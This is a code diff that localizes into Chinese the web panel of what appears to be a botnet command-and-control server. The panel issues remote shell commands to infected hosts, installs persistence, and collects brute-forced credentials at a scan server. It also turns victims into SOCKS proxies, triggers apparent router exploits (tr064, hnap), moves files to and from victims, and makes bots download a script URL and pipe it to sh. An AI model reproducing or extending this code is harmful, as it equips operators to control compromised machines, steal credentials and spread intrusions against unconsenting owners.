-    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="username">' +
+    '<label>认证用户名 (可选)</label>' +
+    '<input type="text" id="socks-m-user" value="' + escHtml(defUser) + '" placeholder="输入用户名(留空无密码)">' +
     '</div>' +
     '<div class="socks-modal-field">' +
-    '<label>Password</label>' +
-    '<input type="text" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="password">' +
+    '<label>认证密码 (可选)</label>' +
+    '<input type="text" id="socks-m-pass" value="' + escHtml(defPass) + '" placeholder="输入密码(留空无密码)">' +
     '</div>' +
     '</div>' +
     '<div class="socks-modal-btns">' +
-    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">Cancel</button>' +
-    '<button class="socks-modal-btn socks-modal-start" onclick="submitSocksModal()">Start</button>' +
+    '<button class="socks-modal-btn socks-modal-cancel" onclick="closeSocksModal()">取消</button>' +
+    '<button class="socks-modal-btn socks-modal-start" onclick="submitSocksModal()">启动</button>' +
     '</div>' +
     '</div>';
   overlay.setAttribute('data-bot', botID);
@@ -1024,7 +1024,7 @@ function popupStartSocks(botID) {
     if (!sel) return;
     sel.innerHTML = '';
     if (!relays || !relays.length) {
-      sel.innerHTML = '<option value="">No relays configured</option>';
+      sel.innerHTML = '<option value="">未配置中继节点</option>';
       return;
     }
     relays.forEach(function (r) {
@@ -1035,7 +1035,7 @@ function popupStartSocks(botID) {
     });
   }).catch(function () {
     var sel = document.getElementById('socks-m-relay');
-    if (sel) sel.innerHTML = '<option value="">Failed to load relays</option>';
+    if (sel) sel.innerHTML = '<option value="">加载中继节点失败</option>';
   });
 
   requestAnimationFrame(function () { overlay.classList.add('open'); });
@@ -1062,7 +1062,7 @@ function submitSocksModal() {
 
   if (mode === 'relay') {
     var relay = (document.getElementById('socks-m-relay') || {}).value;
-    if (!relay) { showToast('No relay selected', false); return; }
+    if (!relay) { showToast('未选择中继节点', false); return; }
     popupCmd(botID, '!socks ' + relay);
   } else {
     var port = (document.getElementById('socks-m-port') || {}).value || '1080';
@@ -1077,31 +1077,31 @@ function submitSocksModal() {
 // ---------------------------------------------------------------------------
 
 var cmdArgDefs = {
-  '!shell': [{ id: 'arg-shell-cmd', label: 'Command', placeholder: 'e.g. whoami, ls -la, cat /etc/passwd', tooltip: 'Shell command to execute on targeted bots. Output is returned via C2.' }],
-  '!detach': [{ id: 'arg-detach-cmd', label: 'Command', placeholder: 'e.g. nohup ./payload &', tooltip: 'Command to run in background on bots. No output returned — fire and forget.' }],
+  '!shell': [{ id: 'arg-shell-cmd', label: '执行命令', placeholder: '例如 whoami, ls -la, cat /etc/passwd', tooltip: '在目标主机上执行的Shell命令，结果通过C2回传' }],
+  '!detach': [{ id: 'arg-detach-cmd', label: '执行命令', placeholder: '例如 nohup ./payload &', tooltip: '在目标主机后台执行的命令，不等待回显' }],
   '!socks': [
     {
       id: 'arg-socks-mode', label: 'Mode', type: 'select', options: [
-        { v: 'direct', t: 'Direct (listen on bot)' },
-        { v: 'relay', t: 'Relay (backconnect)' }
+        { v: 'direct', t: '直接模式 (在主机本地监听)' },
+        { v: 'relay', t: '中继模式 (反向连接中继)' }
       ]
     },
-    { id: 'arg-socks-port', label: 'Listen Port', placeholder: 'e.g. 1080 (default)', showWhen: { field: 'arg-socks-mode', val: 'direct' }, tooltip: 'TCP port the SOCKS5 proxy listens on. Default 1080.' },
-    { id: 'arg-socks-relay', label: 'Relay', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' }, tooltip: 'Relay server the bot backconnects to. Select from configured relays.' },
-    { id: 'arg-socks-user', label: 'Auth Username (optional)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '', tooltip: 'SOCKS5 auth username. Leave empty for no auth.' },
-    { id: 'arg-socks-pass', label: 'Auth Password (optional)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password', tooltip: 'SOCKS5 auth password. Leave empty for no auth.' }
+    { id: 'arg-socks-port', label: '监听端口', placeholder: '例如 1080 (默认)', showWhen: { field: 'arg-socks-mode', val: 'direct' }, tooltip: 'SOCKS5代理监听的本地端口，默认1080' },
+    { id: 'arg-socks-relay', label: '中继节点', type: 'select', options: [], showWhen: { field: 'arg-socks-mode', val: 'relay' }, tooltip: '主机反连的中继服务器，从已配置的中继中选择' },
+    { id: 'arg-socks-user', label: '认证账号 (可选)', placeholder: typeof DEFAULT_PROXY_USER !== 'undefined' ? DEFAULT_PROXY_USER : '', tooltip: 'SOCKS5认证用户名，留空表示无需认证' },
+    { id: 'arg-socks-pass', label: '认证密码 (可选)', placeholder: typeof DEFAULT_PROXY_PASS !== 'undefined' ? DEFAULT_PROXY_PASS : '', type: 'password', tooltip: 'SOCKS5认证密码，留空表示无需认证' }
   ],
   '!stopsocks': [],
   '!socksauth': [
-    { id: 'arg-sa-user', label: 'Username', placeholder: 'socks username', tooltip: 'New SOCKS5 username to set on the bot proxy.' },
-    { id: 'arg-sa-pass', label: 'Password', placeholder: 'socks password', type: 'password', tooltip: 'New SOCKS5 password to set on the bot proxy.' }
+    { id: 'arg-sa-user', label: '用户名', placeholder: 'SOCKS用户名', tooltip: '主机代理的新SOCKS5用户名' },
+    { id: 'arg-sa-pass', label: '密码', placeholder: 'SOCKS密码', type: 'password', tooltip: '主机代理的新SOCKS5密码' }
   ],
   '!info': [], '!persist': [],
-  '!scan': [{ id: 'arg-scan-addr', label: 'Scan Server', placeholder: 'host:port (e.g. 1.2.3.4:48290)', tooltip: 'Address of the scan listener server that receives credential results from bots.' }],
+  '!scan': [{ id: 'arg-scan-addr', label: '扫描结果接收端', placeholder: 'host:port (如 1.2.3.4:48290)', tooltip: '接收扫描爆破凭据结果的服务端地址' }],
   '!stopscan': [],
   '!tr064': [], '!stoptr064': [],
   '!hnap': [], '!stophnap': [],
-  '!reinstall': [{ id: 'arg-reinstall-url', label: 'Script URL', placeholder: 'e.g. http://example.com/x.sh', tooltip: 'URL to a loader script. Bot kills itself, downloads this script, and pipes it to sh.' }],
+  '!reinstall': [{ id: 'arg-reinstall-url', label: '脚本下载URL', placeholder: '例如 http://example.com/x.sh', tooltip: '下载执行脚本的URL。主机下载后通过sh执行替换自身' }],
   '!lolnogtfo': []
 };
 
@@ -1165,16 +1165,16 @@ function sendCmd() {
   var typ = document.getElementById('cmd-type').value;
   var args = buildArgs().trim();
   var botID = document.getElementById('cmd-bot').value.trim();
-  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('Please enter a command', false); return; }
-  if (typ === '!reinstall' && !args) { showToast('Please enter a script URL', false); return; }
+  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('请输入要执行的命令', false); return; }
+  if (typ === '!reinstall' && !args) { showToast('请输入脚本URL地址', false); return; }
   if (typ === '!socksauth') {
     var u = (document.getElementById('arg-sa-user') || {}).value || '';
     var p = (document.getElementById('arg-sa-pass') || {}).value || '';
-    if (!u || !p) { showToast('Username and password required', false); return; }
+    if (!u || !p) { showToast('必须提供用户名和密码', false); return; }
   }
 
-  if (typ === '!lolnogtfo' && !confirm('Kill all targeted bots? This cannot be undone.')) return;
-  if (typ === '!reinstall' && !confirm('Run reinstall script on all targeted bots?')) return;
+  if (typ === '!lolnogtfo' && !confirm('确定销毁所有目标主机？此操作无法撤销！')) return;
+  if (typ === '!reinstall' && !confirm('确定在所有目标主机上执行重装更新？')) return;
   var command = typ;
   if (args) command += ' ' + args;
   fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: command, botID: botID }) })
@@ -1189,7 +1189,7 @@ function sendCmd() {
         }
       }
     })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -1205,17 +1205,17 @@ function renderSocksDash() {
   document.getElementById('socks-active').textContent = active.length;
   document.getElementById('socks-total').textContent = bots.length;
   var wrap = document.getElementById('socks-dash-wrap');
-  if (!active.length) { wrap.innerHTML = '<div class="no-bots">No active SOCKS proxies</div>'; return; }
-  var html = '<table class="socks-dash-table"><thead><tr><th>Bot ID</th><th>IP</th><th>Country</th><th>Port</th><th>Auth</th><th>Running Since</th><th></th></tr></thead><tbody>';
+  if (!active.length) { wrap.innerHTML = '<div class="no-bots">暂无活跃的SOCKS代理</div>'; return; }
+  var html = '<table class="socks-dash-table"><thead><tr><th>主机编号</th><th>IP地址</th><th>国家/地区</th><th>中继端口</th><th>认证</th><th>运行时间</th><th>操作</th></tr></thead><tbody>';
   active.forEach(function (b) {
     var id = b.botID.replace(/'/g, "\\'");
     html += '<tr><td style="color:var(--blue);font-family:monospace">' + escHtml(b.botID) + '</td>' +
       '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
       '<td><span class="country-badge">' + escHtml(b.country) + '</span></td>' +
       '<td style="color:var(--accent);font-family:monospace">' + (b.socksRelay || '-') + '</td>' +
-      '<td>' + (b.socksUser || '<span style="color:var(--text-dim)">none</span>') + '</td>' +
+      '<td>' + (b.socksUser || '<span style="color:var(--text-dim)">无</span>') + '</td>' +
       '<td>' + (b.socksStarted ? ago(b.socksStarted) : '-') + '</td>' +
-      '<td><button class="socks-stop-btn" onclick="confirmStopSocks(\'' + id + '\')">Stop</button></td></tr>';
+      '<td><button class="socks-stop-btn" onclick="confirmStopSocks(\'' + id + '\')">停止</button></td></tr>';
   });
   wrap.innerHTML = html + '</tbody></table>';
 }
@@ -1235,7 +1235,7 @@ function populateRelayDropdown() {
     if (!sel) return;
     sel.innerHTML = '';
     if (!relays.length) {
-      sel.innerHTML = '<option value="">No relays configured</option>';
+      sel.innerHTML = '<option value="">未配置中继节点</option>';
       return;
     }
     relays.forEach(function (r) {
@@ -1271,8 +1271,8 @@ function renderRelayHealthCards(relays) {
   if (!relays || !relays.length) {
     wrap.innerHTML =
       '<div class="relay-empty">' +
-      '<span>No relays configured</span>' +
-      '<button class="relay-add-btn" onclick="showAddRelayModal()" data-tooltip="Add a relay server to the pool">+ Add Relay</button>' +
+      '<span>未配置中继节点</span>' +
+      '<button class="relay-add-btn" onclick="showAddRelayModal()" data-tooltip="Add a relay server to the pool">+ 添加中继节点</button>' +
       '</div>';
     return;
   }
@@ -1288,24 +1288,24 @@ function renderRelayHealthCards(relays) {
       '<span class="sse-indicator ' + dotCls + '" style="margin-right:8px"></span>' +
       '<span class="rhc-name">' + escHtml(r.name || '—') + '</span>' +
       '<span class="rhc-host">' + escHtml(r.host || '') + ':' + escHtml(r.socksPort || '1080') + '</span>' +
-      '<button class="rhc-remove" onclick="removeRelay(\'' + escHtml(r.id) + '\')" data-tooltip="Remove this relay">&times;</button>' +
+      '<button class="rhc-remove" onclick="removeRelay(\'' + escHtml(r.id) + '\')" data-tooltip="移除该中继节点">&times;</button>' +
       '</div>' +
       '<div class="rhc-stats">' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Active</span><span class="rhc-stat-val">' + (r.activeConns || 0) + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Total sessions</span><span class="rhc-stat-val">' + (r.totalSessions || 0) + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Bots</span><span class="rhc-stat-val">' + (r.connectedBots || 0) + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Up ↑</span><span class="rhc-stat-val">' + relayBytesStr(r.bytesUp) + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Down ↓</span><span class="rhc-stat-val">' + relayBytesStr(r.bytesDown) + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Failed</span><span class="rhc-stat-val">' + (r.failedSessions || 0) + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Uptime</span><span class="rhc-stat-val">' + uptime + '</span></div>' +
-      '<div class="rhc-stat"><span class="rhc-stat-label">Last seen</span><span class="rhc-stat-val">' + lastSeen + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">活跃连接</span><span class="rhc-stat-val">' + (r.activeConns || 0) + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">总会话数</span><span class="rhc-stat-val">' + (r.totalSessions || 0) + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">已连接主机</span><span class="rhc-stat-val">' + (r.connectedBots || 0) + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">上行 ↑</span><span class="rhc-stat-val">' + relayBytesStr(r.bytesUp) + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">下行 ↓</span><span class="rhc-stat-val">' + relayBytesStr(r.bytesDown) + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">失败数</span><span class="rhc-stat-val">' + (r.failedSessions || 0) + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">在线时间</span><span class="rhc-stat-val">' + uptime + '</span></div>' +
+      '<div class="rhc-stat"><span class="rhc-stat-label">最近活跃</span><span class="rhc-stat-val">' + lastSeen + '</span></div>' +
       '</div>' +
       '<div class="rhc-footer">' +
       '<code class="rhc-cmd">-c2 ' + location.origin + '/api/relay-report -name ' + escHtml(r.name || 'relay') + '</code>' +
       '</div>' +
       '</div>';
   });
-  html += '<button class="relay-add-btn" onclick="showAddRelayModal()" data-tooltip="Add a relay server to the pool">+ Add Relay</button>';
+  html += '<button class="relay-add-btn" onclick="showAddRelayModal()" data-tooltip="Add a relay server to the pool">+ 添加中继节点</button>';
   html += '</div>';
   wrap.innerHTML = html;
 }
@@ -1320,17 +1320,17 @@ function fmtUptimeSecs(s) {
 function removeRelay(id) {
   fetch('/api/relays?id=' + encodeURIComponent(id), { method: 'DELETE' })
     .then(function (r) { return r.json(); })
-    .then(function () { loadRelayStats(); showToast('Relay removed', true); })
-    .catch(function () { showToast('Failed to remove relay', false); });
+    .then(function () { loadRelayStats(); showToast('中继节点已删除', true); })
+    .catch(function () { showToast('删除中继节点失败', false); });
 }
 
 function showAddRelayModal() {
   showUrlInput({
-    title: 'Add Relay',
-    message: 'Enter the relay address. The relay binary will connect to this CNC to push stats.',
+    title: '添加中继节点',
+    message: '输入中继服务器地址。中继程序连接到主控端并上报状态。',
     placeholder: 'relay.example.com',
     required: true,
-    confirmText: 'Add',
+    confirmText: '添加',
     icon: 'warn',
     confirmClass: 'ok',
     onConfirm: function (host) {
@@ -1345,8 +1345,8 @@ function showAddRelayModal() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(body)
       }).then(function (r) { return r.json(); })
-        .then(function () { loadRelayStats(); showToast('Relay added', true); })
-        .catch(function () { showToast('Failed to add relay', false); });
+        .then(function () { loadRelayStats(); showToast('中继节点添加成功', true); })
+        .catch(function () { showToast('添加中继节点失败', false); });
     }
   });
 }
@@ -1417,12 +1417,12 @@ function filterActivity() {
   var countEl = document.getElementById('activity-count');
   if (countEl) {
     if (q || activityTypeFilter !== 'all') { countEl.textContent = shown + '/' + entries.length; }
-    else { countEl.textContent = entries.length ? entries.length + ' events' : ''; }
+    else { countEl.textContent = entries.length ? entries.length + ' 条记录' : ''; }
   }
 }
 
 function clearActivity() {
-  document.getElementById('activity-list').innerHTML = '<div class="no-bots">No activity yet</div>';
+  document.getElementById('activity-list').innerHTML = '<div class="no-bots">暂无活动日志</div>';
   var countEl = document.getElementById('activity-count');
   if (countEl) countEl.textContent = '';
 }
@@ -1470,7 +1470,7 @@ function populateTaskRelayDropdown() {
     if (!sel) return;
     sel.innerHTML = '';
     if (!relays || !relays.length) {
-      sel.innerHTML = '<option value="">No relays configured</option>';
+      sel.innerHTML = '<option value="">未配置中继节点</option>';
       return;
     }
     relays.forEach(function (r) {
@@ -1521,7 +1521,7 @@ function renderTaskTable(tasks) {
   var activeCount = document.getElementById('task-active-count');
   if (activeCount) activeCount.textContent = active.length;
   if (!tasks || !tasks.length) {
-    wrap.innerHTML = '<div class="task-empty">No active tasks. Create one above.</div>';
+    wrap.innerHTML = '<div class="task-empty">暂无活跃任务，可在上方创建。</div>';
     return;
   }
   var html = '';
@@ -1529,10 +1529,10 @@ function renderTaskTable(tasks) {
     var isExpired = t.expired;
     var dotClass = isExpired ? 'expired' : 'active';
     var badgeClass = t.runOnce ? 'once' : 'every';
-    var badgeText = t.runOnce ? 'Run Once' : 'Every Join';
+    var badgeText = t.runOnce ? '仅执行一次' : '上线即执行';
     var created = new Date(t.createdAt);
     var createdStr = ('0' + created.getHours()).slice(-2) + ':' + ('0' + created.getMinutes()).slice(-2);
-    var expiresStr = 'never';
+    var expiresStr = '永久有效';
     if (t.expiresAt && !isExpired) {
       var exp = new Date(t.expiresAt);
       var remaining = Math.max(0, Math.floor((exp - Date.now()) / 1000));
@@ -1540,18 +1540,18 @@ function renderTaskTable(tasks) {
       else if (remaining > 60) expiresStr = Math.floor(remaining / 60) + 'm ' + (remaining % 60) + 's';
       else expiresStr = remaining + 's';
     } else if (isExpired) {
-      expiresStr = 'expired';
+      expiresStr = '已过期';
     }
     html += '<div class="task-card' + (isExpired ? ' expired' : '') + '">' +
       '<div class="task-status-dot ' + dotClass + '"></div>' +
       '<div class="task-cmd" title="' + escHtml(t.command) + '">' + escHtml(t.command) + '</div>' +
       '<div class="task-meta">' +
         '<span class="task-badge ' + badgeClass + '">' + badgeText + '</span>' +
-        '<span class="task-meta-item"><span class="task-meta-label">created</span> ' + createdStr + '</span>' +
-        '<span class="task-meta-item"><span class="task-meta-label">TTL</span> ' + expiresStr + '</span>' +
-        '<span class="task-meta-item"><span class="task-meta-label">ran on</span> ' + t.executed + ' bots</span>' +
+        '<span class="task-meta-item"><span class="task-meta-label">创建时间:</span> ' + createdStr + '</span>' +
+        '<span class="task-meta-item"><span class="task-meta-label">有效期:</span> ' + expiresStr + '</span>' +
+        '<span class="task-meta-item"><span class="task-meta-label">执行于:</span> ' + t.executed + ' 台主机</span>' +
       '</div>' +
-      '<button class="task-remove" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Stop</button>' +
+      '<button class="task-remove" onclick="deleteTask(\'' + escHtml(t.id) + '\')">停止</button>' +
     '</div>';
   });
   wrap.innerHTML = html;
@@ -1560,11 +1560,11 @@ function renderTaskTable(tasks) {
 function addTask() {
   var command = buildTaskCommand();
   var typ = document.getElementById('task-type').value;
-  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('Please enter a command', false); return; }
+  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('请输入要执行的命令', false); return; }
   if (typ === '!socksauth') {
     var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
     var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
-    if (!u || !p) { showToast('Username and password required', false); return; }
+    if (!u || !p) { showToast('必须提供用户名和密码', false); return; }
   }
   var duration = parseInt((document.getElementById('task-duration') || {}).value) || 0;
   var runOnce = (document.getElementById('task-runonce') || {}).checked || false;
@@ -1574,25 +1574,25 @@ function addTask() {
     body: JSON.stringify({ command: command, duration: duration, runOnce: runOnce })
   }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.success) {
-      showToast('Task created: ' + command, true);
+      showToast('任务创建成功: ' + command, true);
       document.getElementById('task-duration').value = '0';
       document.getElementById('task-runonce').checked = false;
       updateTaskArgFields();
       loadTasks();
     } else {
-      showToast(d.error || 'Failed to create task', false);
+      showToast(d.error || '创建任务失败', false);
     }
-  }).catch(function () { showToast('Request failed', false); });
+  }).catch(function () { showToast('请求失败', false); });
 }
 
 function deleteTask(id) {
-  if (!confirm('Remove this task?')) return;
+  if (!confirm('确定删除此任务？')) return;
   fetch('/api/tasks?id=' + encodeURIComponent(id), { method: 'DELETE' })
     .then(function (r) { return r.json(); })
     .then(function (d) {
-      showToast(d.success ? 'Task removed' : (d.error || 'Failed'), d.success !== false);
+      showToast(d.success ? '任务已删除' : (d.error || '操作失败'), d.success !== false);
       loadTasks();
-    }).catch(function () { showToast('Request failed', false); });
+    }).catch(function () { showToast('请求失败', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -1635,7 +1635,7 @@ function toggleNotifs() {
 
 function renderNotifList() {
   var nl = document.getElementById('notif-list');
-  if (!notifHistory.length) { nl.innerHTML = '<div class="notif-empty">No notifications yet</div>'; return; }
+  if (!notifHistory.length) { nl.innerHTML = '<div class="notif-empty">暂无通知消息</div>'; return; }
   nl.innerHTML = notifHistory.map(function (n) {
     return '<div class="notif-entry"><div class="notif-time">' + escHtml(n.time) + '</div><div class="notif-msg">' + escHtml(n.msg) + '</div></div>';
   }).reverse().join('');
@@ -1657,15 +1657,15 @@ var _shellFontSize = parseInt(localStorage.getItem('vision_shell_font_size') || 
 
 // Tab completion definitions
 var tcCommands = [
-  { cmd: '!shell', desc: 'Execute shell command' },
-  { cmd: '!detach', desc: 'Background exec (no output)' },
-  { cmd: '!stream', desc: 'Streaming exec (real-time)' },
-  { cmd: '!socks', desc: 'Start SOCKS proxy' },
-  { cmd: '!stopsocks', desc: 'Stop SOCKS proxy' },
-  { cmd: '!socksauth', desc: 'Set SOCKS credentials' },
-  { cmd: '!info', desc: 'System information' },
-  { cmd: '!persist', desc: 'Install persistence' },
-  { cmd: '!kill', desc: 'Self-destruct' }
+  { cmd: '!shell', desc: '执行Shell命令(返回输出)' },
+  { cmd: '!detach', desc: '后台静默执行(不等待回显)' },
+  { cmd: '!stream', desc: '流式执行命令(实时输出)' },
+  { cmd: '!socks', desc: '启动SOCKS5代理' },
+  { cmd: '!stopsocks', desc: '停止SOCKS代理' },
+  { cmd: '!socksauth', desc: '配置SOCKS账号密码' },
+  { cmd: '!info', desc: '查看系统详细信息' },
+  { cmd: '!persist', desc: '安装系统持久化驻留' },
+  { cmd: '!kill', desc: '清除并自我销毁下线' }
 ];
 var tcIdx = -1, tcMatches = [];
 
@@ -1724,7 +1724,7 @@ function activateShellTab(idx) {
   var overlay = document.getElementById('shell-overlay');
   var output = document.getElementById('shell-output');
   var input = document.getElementById('shell-input');
-  document.getElementById('shell-title').textContent = 'Shell: ' + tab.botID;
+  document.getElementById('shell-title').textContent = '终端终端(Shell): ' + tab.botID;
 
   // Bot info in header meta
   var b = window._bots && window._bots[tab.botID];
@@ -1760,7 +1760,7 @@ function activateShellTab(idx) {
   shellHistIdx = shellHistory.length;
   renderShellTabs();
   overlay.classList.add('open');
-  // Apply saved font size
+  // 应用 saved font size
   document.querySelectorAll('.shell-output').forEach(function (el) { el.style.fontSize = _shellFontSize + 'px'; });
   input.focus();
 
@@ -1827,10 +1827,10 @@ function activateShellTab(idx) {
       var a = document.createElement('a');
       a.href = url; a.download = name; a.click();
       URL.revokeObjectURL(url);
-      showToast('Downloaded: ' + name, true);
-    } catch (ex) { showToast('Download failed: ' + ex.message, false); }
+      showToast('下载完成: ' + name, true);
+    } catch (ex) { showToast('下载失败: ' + ex.message, false); }
   }
-  shellWS.onclose = function () { appendOutput('\n[Connection closed]\n'); };
+  shellWS.onclose = function () { appendOutput('\n[连接已断开]\n'); };
 
   if (_reusingBg) {
     // Flush any output buffered while the shell was in the background
@@ -1977,7 +1977,7 @@ function parseClickableOutput(text) {
     span.textContent = val;
     if (m[1]) {
       span.className = 'out-ip'; span.title = 'Copy IP';
-      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('Copied: ' + v, true); }; })(val);
+      span.onclick = (function (v) { return function () { try { navigator.clipboard.writeText(v); } catch (e) { } showToast('已复制: ' + v, true); }; })(val);
     } else {
       span.className = 'out-path'; span.title = 'Navigate to path';
       span.onclick = (function (v) { return function () { shellCd(v); }; })(val);
@@ -2089,7 +2089,7 @@ function parseFileList(output) {
   });
 
   if (!entries.length) {
-    wrap.innerHTML = '<div class="file-empty">Empty directory</div>';
+    wrap.innerHTML = '<div class="file-empty">空目录</div>';
     return;
   }
 
@@ -2126,7 +2126,8 @@ var _ctxEntry = null;
 function showFileCtx(e, name, isDir) {
   _ctxEntry = { name: name, isDir: isDir, cwd: shellCwd };
   var m = document.getElementById('file-ctx-menu');
-  document.getElementById('ctx-cd-item').style.display = isDir ? '' : 'none';
+  // cd item
+document.getElementById('ctx-cd-item').style.display = isDir ? '' : 'none';
   document.getElementById('ctx-cat-item').style.display = !isDir ? '' : 'none';
   document.getElementById('ctx-chmod-item').style.display = !isDir ? '' : 'none';
   var x = e.clientX, y = e.clientY;
@@ -2153,7 +2154,7 @@ function _ctxPath() {
 function ctxCopyPath() {
   var p = _ctxPath();
   try { navigator.clipboard.writeText(p); } catch (e) { }
-  showToast('Copied: ' + p, true); hideFileCtx();
+  showToast('已复制路径: ' + p, true); hideFileCtx();
 }
 
 function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
@@ -2161,17 +2162,17 @@ function ctxCd() { shellCd(_ctxEntry.name); hideFileCtx(); }
 function ctxCat() { shellSendCmd('cat ' + _shellQuoteJs(_ctxEntry.name)); hideFileCtx(); }
 
 function ctxChmod() {
-  var m = prompt('chmod mode (octal):', '755');
+  var m = prompt('输入权限模式 (如 755):', '755');
   hideFileCtx();
   if (!m) return;
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   shellWS.send(JSON.stringify({ command: '!chmod ' + m + ' ' + _ctxPath() }));
   setTimeout(refreshFiles, 600);
 }
 
 function ctxDelete() {
-  if (!confirm('Delete ' + _ctxEntry.name + '?')) { hideFileCtx(); return; }
-  if (!shellWS || shellWS.readyState !== 1) { hideFileCtx(); showToast('Not connected', false); return; }
+  if (!confirm('确定删除 ' + _ctxEntry.name + '？')) { hideFileCtx(); return; }
+  if (!shellWS || shellWS.readyState !== 1) { hideFileCtx(); showToast('未连接', false); return; }
   if (_ctxEntry.isDir) {
     shellSendCmd('rm -rf ' + _shellQuoteJs(_ctxEntry.name));
   } else {
@@ -2181,10 +2182,10 @@ function ctxDelete() {
 }
 
 function ctxRename() {
-  var n = prompt('Rename to:', _ctxEntry.name);
+  var n = prompt('重命名为:', _ctxEntry.name);
   hideFileCtx();
   if (!n || n === _ctxEntry.name) return;
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   var dst = (_ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + n : n;
   shellWS.send(JSON.stringify({ command: '!mv ' + _ctxPath() + ' ' + dst }));
   setTimeout(refreshFiles, 600);
@@ -2192,7 +2193,7 @@ function ctxRename() {
 
 function ctxDownload() {
   hideFileCtx();
-  if (_ctxEntry.isDir) { showToast('Cannot download a directory', false); return; }
+  if (_ctxEntry.isDir) { showToast('无法直接下载整个目录', false); return; }
   shellDownloadFile(_ctxEntry.name);
 }
 
@@ -2210,14 +2211,14 @@ function shellSendCmd(cmd) {
 
 // Sends a !download command; the CNC relays the file back as a {type:"file"} WS frame.
 function shellDownloadFile(name) {
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   var path = (_ctxEntry && _ctxEntry.cwd && _ctxEntry.cwd !== '~') ? _ctxEntry.cwd + '/' + name : name;
   shellSendCmd('!download ' + path);
 }
 
 // Triggers the hidden file input to pick a file for upload.
 function shellUploadFile() {
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   document.getElementById('shell-upload-input').value = '';
   document.getElementById('shell-upload-input').click();
 }
@@ -2226,7 +2227,7 @@ function shellUploadFile() {
 function shellHandleUpload(input) {
   var file = input.files && input.files[0];
   if (!file || !shellWS || shellWS.readyState !== 1) return;
-  if (file.size > 10 * 1024 * 1024) { showToast('File too large (>10MB)', false); return; }
+  if (file.size > 10 * 1024 * 1024) { showToast('文件过大(不能超过10MB)', false); return; }
   var destDir = shellCwd && shellCwd !== '~' ? shellCwd : '/tmp';
   var destPath = destDir + '/' + file.name;
   var reader = new FileReader();
@@ -2244,22 +2245,22 @@ function shellHandleUpload(input) {
 
 function renderInfoSidebar(b) {
   var body = document.getElementById('info-sidebar-body');
-  if (!b) { body.innerHTML = '<div class="file-empty">No bot info</div>'; return; }
+  if (!b) { body.innerHTML = '<div class="file-empty">无主机详情</div>'; return; }
   body.innerHTML =
-    '<div class="isb-row"><span class="isb-label">Bot ID</span><span class="isb-val" style="color:var(--blue)">' + escHtml(b.botID) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">IP Address</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Country</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Architecture</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">主机编号(ID)</span><span class="isb-val" style="color:var(--blue)">' + escHtml(b.botID) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">IP地址</span><span class="isb-val">' + escHtml(b.ip) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">国家/地区</span><span class="isb-val" style="color:var(--cyan)">' + escHtml(b.country) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">系统架构</span><span class="isb-val">' + escHtml(b.arch) + '</span></div>' +
     '<div class="isb-divider"></div>' +
-    '<div class="isb-row"><span class="isb-label">RAM</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">CPU Cores</span><span class="isb-val">' + b.cpuCores + '</span></div>' +
